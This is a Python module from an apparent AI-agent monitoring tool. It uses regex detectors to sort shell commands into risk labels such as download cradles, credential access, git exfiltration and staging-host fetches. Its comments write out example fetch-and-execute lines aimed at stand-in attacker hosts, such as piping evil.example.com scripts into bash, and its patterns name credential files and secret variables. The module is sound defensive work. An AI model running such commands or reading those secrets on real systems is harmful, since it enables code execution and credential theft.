"""Command classification shared by the sequence rules and the hook client.

The default privacy configuration hashes tool arguments inside the hook process
and never stores command text, which left every command-regex rule blind on real
captured traffic: the demo and the tests injected `command`, production events
did not have one. The fix is to classify the command *where the plaintext is
still visible* — in the hook, before hashing — and ship only category labels
(`tool.traits`). No command text leaves the machine; the rules match the labels
when the text is absent.

This module is imported by scripts/agentmetry_ingest.py via the same sys.path
mechanism as the DLP scanner, so it must stay dependency-free: `re` only, no
core.config, no pydantic.

Rule docstrings explaining each pattern's provenance stay in rules.py; this
module owns the regexes so the hook and the rules cannot drift apart.
"""

from __future__ import annotations

import re

# A raw-IP URL and a download/execute verb in the same command is a classic
# malware download cradle. Legit tooling uses domains and package managers.
RAW_IP_URL = re.compile(r"https?://((?:\d{1,3}\.){3}\d{1,3})")
# Loopback is not ingress — fetching your own orchestrator's health endpoint
# must not read as a download cradle (see rules.py for the war story).
LOOPBACK_IP = re.compile(r"^(?:127(?:\.\d{1,3}){3}|0\.0\.0\.0)$")
# Every URL host in a command, so a pipe-to-interpreter can be judged by where it
# actually points rather than by shape alone.
URL_HOST = re.compile(r"https?://(\[[0-9a-f:]+\]|[^/\s:'\"]+)", re.IGNORECASE)
# The same machine, spelled the several ways people spell it. `0.0.0.0` is here
# because curling your own bound service by that address is common, even though
# it means "all interfaces" when binding rather than when connecting.
LOOPBACK_HOST = re.compile(
    r"^(?:127(?:\.\d{1,3}){3}|0\.0\.0\.0|localhost|\[::1\]|\[::ffff:127(?:\.\d{1,3}){3}\])$",
    re.IGNORECASE,
)
DOWNLOAD_EXEC = re.compile(
    r"downloadstring|downloadfile|invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b|"
    r"certutil|bitsadmin|invoke-expression|\biex\b",
    re.IGNORECASE,
)
ENCODED_CMD = re.compile(r"-enc(odedcommand)?\b|frombase64string", re.IGNORECASE)

# Fetch remote content and feed it straight to an interpreter (ADI §4.2).
PIPE_TO_SHELL = re.compile(
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
    r"(sudo\s+)?\b(ba|z|k|da)?sh\b|"
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b[^|;&]*[|]\s*"
    r"(iex|invoke-expression|python\d?|perl|ruby|node)\b",
    re.IGNORECASE,
)

# The same cradle without a pipe. `bash <(curl -s https://host/x.sh)` and
# `source <(curl ...)` fetch and execute in one step and never contain the `|`
# that PIPE_TO_SHELL requires, so they walked past every download-cradle rule.
# Found by auditing the engine for five-minute evasions rather than by a
# detection firing, which is the point: the corpus only ever contained the
# shapes somebody thought to write down.
# `<(` is process substitution and `< <(` redirects from it; both are one `<`
# away from each other and an earlier draft of this pattern required two,
# matching neither of the forms an attacker would actually type.
PROC_SUBST_EXEC = re.compile(
    r"\b(?:sudo\s+)?(?:ba|z|k|da)?sh\b\s*<\s*(?:<\s*)?\(\s*(?:curl|wget|iwr)\b|"
    r"\b(?:source|\.)\s+<\s*(?:<\s*)?\(\s*(?:curl|wget|iwr)\b|"
    r"\b(?:python\d?|perl|ruby|node)\b[^\n|;&]*<\s*(?:<\s*)?\(\s*(?:curl|wget|iwr)\b",
    re.IGNORECASE,
)

# An interpreter that speaks HTTP is a network client, whatever it is called.
# `_NETWORK_CLIENT` in mitre.py listed curl, wget, nc, scp and friends, so
# `python -c "urllib.request.urlopen(...)"` carrying a file out was tagged
# generic Execution and `credential-exfil` could not fire on it. That is the
# modal exfil channel in a cloud or CI environment, where curl may not even be
# installed but a Python runtime always is.
INTERPRETER_NETWORK = re.compile(
    r"\b(?:python\d?|node|deno|bun|ruby|perl|php)\b[^\n]*?"
    r"(?:urlopen|urllib|requests\.(?:get|post|put|patch|request)|httpx|"
    r"http\.client|aiohttp|socket\.(?:socket|create_connection)|"
    r"net/http|open-uri|Net::HTTP|LWP::|"
    r"fetch\s*\(|axios|XMLHttpRequest|file_get_contents|curl_exec)",
    re.IGNORECASE,
)

# `bash: rm -rf build/` is a deletion even though the tool is named "Bash".
DELETE_COMMAND = re.compile(
    r"\brm\s+(-[a-z]*\s+)*|\brmdir\b|\bunlink\b|remove-item\b|\bdel\s+/", re.IGNORECASE
)

# Content an outsider can author (gh issues/PRs, git fetch) — ADI provenance.
UNTRUSTED_INPUT_COMMAND = re.compile(
    r"\bgh\s+(issue|pr)\s+(view|list|diff|comment)|"
    r"\bgit\s+(fetch|pull|clone)\b",
    re.IGNORECASE,
)

# PR review provenance (ADI §4.3): description vs code vs merge.
PR_DESC_COMMAND = re.compile(r"\bgh\s+pr\s+view\b", re.IGNORECASE)
PR_COMMIT_COMMAND = re.compile(
    r"\bgh\s+pr\s+(diff|checkout|files)\b|\bgit\s+show\b", re.IGNORECASE
)
PR_MERGE_COMMAND = re.compile(r"\bgh\s+pr\s+merge\b|\bgit\s+merge\b", re.IGNORECASE)

# Cloud and cluster APIs used after credential harvest (HF July 2026 lateral phase).
CLOUD_API = re.compile(
    r"\bkubectl\b|"
    r"(?:^|\s)aws\s+\w|"
    r"\bgcloud\b|"
    r"\baz\s+(?:account|login|keyvault|aks|storage)\b|"
    r"\b(?:hf|huggingface-cli)\b|"
    r"\baliyun\b|\btencentcloud\b|\bbce\b|\bossutil\b|\bcoscmd\b",
    re.IGNORECASE,
)

# Push harvested material to a remote the operator did not intend (Nx s1ngularity).
GIT_EXFIL = re.compile(
    r"\bgit\s+push\b|"
    r"\bgh\s+repo\s+(?:create|sync)\b|"
    r"\bgh\s+release\s+upload\b",
    re.IGNORECASE,
)

# Public staging hosts used for agent C2 (gist, HF raw files, GitHub raw content).
STAGING_HOST = re.compile(
    r"https?://(?:[\w-]+\.)?(?:"
    r"githubusercontent\.com|gist\.github\.com|raw\.github\.com|"
    r"huggingface\.co|pastebin\.com|gitlab\.com|bitbucket\.org"
    r")",
    re.IGNORECASE,
)
STAGING_FETCH = re.compile(
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod)\b",
    re.IGNORECASE,
)
# Second-step execution after a staged download — excludes package managers.
RISKY_EXEC_AFTER_STAGING = re.compile(
    r"\b(bash|sh|zsh|dash)\s+[\w./~-]+\.(?:sh|bash)\b|"
    r"\bpython\d?\s+[\w./~-]+\.py\b|"
    r"\bpython\d?\s+-c\b|"
    r"\b(iex|invoke-expression|eval)\b|"
    r"\bpowershell(?:\.exe)?\s+-(?:enc|f|file)\b",
    re.IGNORECASE,
)
BENIGN_AFTER_STAGING = re.compile(
    r"\b(npm|yarn|pnpm|pip|pip3|cargo|go)\s+(?:install|run|build)\b",
    re.IGNORECASE,
)

# ----------------------------------------------------------------------
# Credential access
#
# This used to live only in mitre.py, as a tuple of substrings matched with
# `p in text`. Two consequences, both real:
#
# 1. `.env` matched anything containing those four characters, so the module
#    path `agentmetry.core.diagnostics.env_file` was tagged T1552.001 and
#    manufactured the credential half of two critical findings (#40).
# 2. It only ever described *paths*, so `echo $AWS_SECRET_ACCESS_KEY` was
#    generic Execution. Reading a secret out of the environment is how
#    credentials are held in every container and CI runner built this decade.
#
# It lives here now because the trait classifier and the MITRE mapper were two
# classifiers making the same judgement from different data, and the sequence
# rules trusted the one with less information. One source, one answer.
# ----------------------------------------------------------------------

# Distinctive enough that seeing them at all is worth a tag. `.aws/credentials`
# and `.docker/config.json` do not turn up in a sentence by accident.
CREDENTIAL_PATH = re.compile(
    r"\.aws[/\\]credentials\b|"
    r"\.netrc\b|\.npmrc\b|"
    r"\.kube[/\\]config\b|"
    r"\bcredentials\.json\b|\bservice-account\b|"
    r"\bsecrets\.ya?ml\b|"
    r"\.docker[/\\]config\.json\b|"
    r"\.config[/\\]gcloud\b",
    re.IGNORECASE,
)

# `.env` needs its own rule because it is four characters long and reads like
# prose. Anchoring it as a filename was not enough: `git commit -m "docs:
# explain .env handling"` still matched, and a commit message is the single
# most likely place for a developer to type it.
#
# So it must look like a *path* (`~/.env`, `./.env`, `config/.env.local`) or sit
# directly after something that reads a file. A bare mention in prose does not
# qualify, which costs nothing: nobody reads a credential file without naming a
# path or a verb.
ENV_FILE = re.compile(
    r"[\w.~$-]*[/\\]\.env(?:\.[A-Za-z0-9_-]+)?\b|"
    r"\b(?:cat|bat|less|more|head|tail|type|source|export|dotenv|load_dotenv|"
    r"get-content|gc|cp|mv|scp|rsync|base64|xxd|od|strings|"
    r"grep|rg|ag|awk|sed|nano|vim|vi|emacs|code|open|start)"
    r"\s+(?:-[-\w]+\s+)*\.env(?:\.[A-Za-z0-9_-]+)?\b|"
    r"^\s*\.env(?:\.[A-Za-z0-9_-]+)?\b",
    re.IGNORECASE | re.MULTILINE,
)

PRIVATE_KEY_PATH = re.compile(
    r"\bid_(?:rsa|ed25519|dsa|ecdsa)\b|\.pem\b|-----BEGIN\b|\.ssh[/\\]",
    re.IGNORECASE,
)

_CREDENTIAL_ENV_NAME = (
    r"(?:AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|AWS_SESSION_TOKEN|"
    r"GITHUB_TOKEN|GH_TOKEN|GITLAB_TOKEN|NPM_TOKEN|PYPI_TOKEN|TWINE_PASSWORD|"
    r"OPENAI_API_KEY|ANTHROPIC_API_KEY|HF_TOKEN|HUGGING_FACE_HUB_TOKEN|"
    r"DOCKER_PASSWORD|KUBE_TOKEN|"
    r"[A-Z][A-Z0-9]*_(?:API_KEY|SECRET|SECRET_KEY|ACCESS_KEY|TOKEN|PASSWORD|PASSWD))"
)

# A *live* reference, not a mention. `$AWS_SECRET_ACCESS_KEY` expands even
# inside double quotes, which is why this is matched against the raw command
# while path patterns are not: writing the bare name into documentation is not
# credential access, and dereferencing it is.
CREDENTIAL_ENV = re.compile(
    rf"\$\{{?{_CREDENTIAL_ENV_NAME}|"
    rf"%{_CREDENTIAL_ENV_NAME}%|"
    rf"\$env:{_CREDENTIAL_ENV_NAME}|"
    rf"\bprintenv\b[^\n|;&]*\b{_CREDENTIAL_ENV_NAME}|"
    rf"\bgetenv\(\s*['\"]{_CREDENTIAL_ENV_NAME}|"
    rf"\benviron(?:\[|\.get\(\s*)['\"]{_CREDENTIAL_ENV_NAME}",
    re.IGNORECASE,
)

# Dumping the whole environment reads every secret in it without naming one.
CREDENTIAL_ENV_DUMP = re.compile(
    r"\bprintenv\b\s*(?:$|[|>;&])|"
    r"\benv\b\s*[|>]|"
    r"\bget-childitem\s+env:|\bgci\s+env:|\bls\s+env:",
    re.IGNORECASE,
)

# Stable vocabulary. Renaming a trait is a breaking change for stored events:
# rules match these strings on events that may be replayed months later.
KNOWN_TRAITS = frozenset({
    "raw_ip_fetch",
    "encoded_cmd",
    "pipe_to_shell",
    "pipe_to_shell_local",
    "cloud_api",
    "git_exfil",
    "staging_fetch",
    "risky_exec",
    "delete_cmd",
    "untrusted_input",
    "pr_desc",
    "pr_commit",
    "pr_merge",
    "credential_access",
    "private_key",
})


# A heredoc opener: `<<EOF`, `<<-EOF`, `<< 'PY'`, `<<"SQL"`.
_HEREDOC_OPEN = re.compile(r"<<-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1")


def mask_literals(command: str, *, include_double: bool = True) -> str:
    """Blank out quoted strings and heredoc bodies, preserving length and layout.

    `include_double=False` masks only the constructs the shell treats as fully
    literal: single quotes and heredoc bodies. Double quotes still expand `$VAR`
    and command substitutions, so their contents are live text, not data. That
    distinction is the whole reason this takes a flag: masking double quotes
    everywhere would blank `"$AWS_SECRET_ACCESS_KEY"` and lose a real credential
    dereference, while not masking them at all leaves the false positives.

    Trait regexes match command text, which cannot tell performing an action from
    writing about one. A command whose *content* was the string
    `gh pr merge 42 --squash` fired `pr-merged-without-review` at critical, and no
    pull request was merged: the text was being written into a test fixture.

    That failure lands hardest on the people most likely to adopt this. Anyone
    authoring detection content, security documentation, or corpus cases spends
    their day typing the exact strings the rules hunt for, and a security tool
    that punishes you for writing about security gets uninstalled.

    Masking rather than deleting keeps every offset intact, so a caller can still
    reason about where in the original command a match sat.

    This is a heuristic and is meant to be. Full shell quoting is a parser's job,
    and a parser that is wrong about an exotic case fails closed in a way nobody
    can debug from a hashed command. The shapes handled here -- single quotes,
    double quotes, heredocs -- are the ones that actually produced false
    positives. Anything it cannot account for stays visible, so the failure mode
    is a trait that still fires rather than one that silently stops.
    """
    if not command or not isinstance(command, str):
        return command or ""

    out = list(command)
    i = 0
    n = len(command)
    quote: str | None = None

    while i < n:
        ch = command[i]

        if quote is None:
            # A heredoc body is content by definition, whatever it contains.
            m = _HEREDOC_OPEN.match(command, i)
            if m:
                delimiter = m.group(2)
                body_start = command.find("\n", m.end())
                if body_start == -1:
                    i = m.end()
                    continue
                body_start += 1
                end = n
                for line_start, line in _iter_lines(command, body_start):
                    if line.strip() == delimiter:
                        end = line_start
                        break
                for j in range(body_start, min(end, n)):
                    if out[j] != "\n":
                        out[j] = " "
                i = min(end, n)
                continue
            if ch == "'" or (ch == '"' and include_double):
                quote = ch
                out[i] = " "
            i += 1
            continue

        # Inside a quote.
        if ch == "\\" and quote == '"' and i + 1 < n:
            out[i] = " "
            out[i + 1] = " "
            i += 2
            continue
        if ch == quote:
            quote = None
            out[i] = " "
            i += 1
            continue
        if ch != "\n":
            out[i] = " "
        i += 1

    return "".join(out)


def _iter_lines(text: str, start: int):
    """(offset, line) for each line from `start`, so a heredoc end can be located."""
    idx = start
    while idx < len(text):
        nl = text.find("\n", idx)
        if nl == -1:
            yield idx, text[idx:]
            return
        yield idx, text[idx:nl]
        idx = nl + 1


def pipes_only_loopback(command: str) -> bool:
    """True when every URL in a pipe-to-interpreter command points at this host.

    `curl http://127.0.0.1:8000/api/v1/audit/status | python -c ...` has the exact
    shape of a download cradle and none of the substance: nothing crosses the
    network and nothing untrusted is executed. Querying your own dev server and
    piping the JSON into an interpreter is a thing developers do several times an
    hour, and this fired at critical on it.

    That is not a cosmetic problem. A critical which fires several times a day on
    normal work does not stay a critical: it becomes the alert people learn to
    scroll past, and by the time a real cradle appears the rule has already lost
    its reader. The DLP manifest records the same lesson from the other side,
    where a bare 40-char pattern matched every git commit SHA.

    Deliberately conservative in two ways.

    Loopback is excluded specifically, rather than remote being required. An
    earlier version of the rule demanded a bare IP address, which let
    `curl https://evil-cdn.example.com/x.sh | bash` straight through -- and a
    domain is what a real attacker uses. Any host that is not provably loopback
    keeps the full-strength trait.

    A command with no URL we can read is treated as remote. `curl $URL | bash`
    resolves at runtime, so we cannot prove where it points, and guessing in the
    quiet direction is how a recorder goes blind.
    """
    hosts = URL_HOST.findall(command or "")
    if not hosts:
        return False
    return all(LOOPBACK_HOST.match(h) for h in hosts)


def classify_command(command: str) -> list[str]:
    """Map a plaintext command to detection trait labels (never the text itself).

    Three views of the same string, because "does this command do X" and "does
    this command mention X" are different questions and the regexes cannot tell
    them apart on their own:

    ``spoken``
        The raw text. Used only where the shell itself would still act on
        quoted content, which in practice means variable expansion.

    ``written``
        Quotes and heredocs blanked. Used for **command words** -- the verbs and
        operators. `curl`, `| bash`, `rm -rf`, `gh pr merge`. A command word
        inside quotes is not a command, it is an argument to `echo`.

    ``literal``
        Single quotes and heredocs blanked, double quotes left alone. Used for
        **arguments** such as paths. `cat "$HOME/.aws/credentials"` is a real
        read and must fire; `echo 'cat ~/.aws/credentials'` is prose.

    The rule that falls out of this, and the one worth remembering: *the verb
    must be unmasked, the arguments may be quoted*. Issue #41 proposed masking
    everything for every trait, which fixes the false positives and silently
    breaks `curl "https://evil.example.com/x.sh" | bash`, where quoting the URL
    is simply how people write it. Trading a visible false positive for an
    invisible false negative is a bad trade for a recorder.
    """
    if not command or not isinstance(command, str):
        return []
    traits: list[str] = []

    spoken = command
    written = mask_literals(command)
    literal = mask_literals(command, include_double=False)

    # The IP may legitimately sit inside quotes; the fetch verb may not.
    remote_ips = [ip for ip in RAW_IP_URL.findall(spoken) if not LOOPBACK_IP.match(ip)]
    if remote_ips and DOWNLOAD_EXEC.search(written):
        traits.append("raw_ip_fetch")
    if ENCODED_CMD.search(written):
        traits.append("encoded_cmd")
    cradle = PIPE_TO_SHELL.search(written) or PROC_SUBST_EXEC.search(written)
    if cradle:
        traits.append(
            "pipe_to_shell_local" if pipes_only_loopback(spoken) else "pipe_to_shell"
        )
    if CLOUD_API.search(written):
        traits.append("cloud_api")
    if GIT_EXFIL.search(written):
        traits.append("git_exfil")
    if STAGING_HOST.search(spoken) and (
        STAGING_FETCH.search(written) or DOWNLOAD_EXEC.search(written)
    ):
        traits.append("staging_fetch")
    if not BENIGN_AFTER_STAGING.search(written) and (
        cradle or RISKY_EXEC_AFTER_STAGING.search(written)
    ):
        traits.append("risky_exec")
    if DELETE_COMMAND.search(written):
        traits.append("delete_cmd")
    if UNTRUSTED_INPUT_COMMAND.search(written):
        traits.append("untrusted_input")

    # Credential access. The env-var forms read `spoken` on purpose: `$SECRET`
    # expands inside double quotes, so `echo "$AWS_SECRET_ACCESS_KEY"` is a real
    # dereference. Path forms read `literal`, which is what stops a heredoc full
    # of source code from being read as a credential read (#40).
    if (
        CREDENTIAL_PATH.search(literal)
        or ENV_FILE.search(literal)
        or CREDENTIAL_ENV.search(spoken)
        or CREDENTIAL_ENV_DUMP.search(written)
    ):
        traits.append("credential_access")
    if PRIVATE_KEY_PATH.search(literal):
        traits.append("private_key")

    # The PR traits read `written`: a command that *writes* `gh pr merge` into a
    # file is not merging anything, and treating it as though it were fired
    # `pr-merged-without-review` at critical on someone authoring a test fixture
    # (issue #24).
    if PR_DESC_COMMAND.search(written):
        traits.append("pr_desc")
    if PR_COMMIT_COMMAND.search(written):
        traits.append("pr_commit")
    if PR_MERGE_COMMAND.search(written):
        traits.append("pr_merge")
    return traits
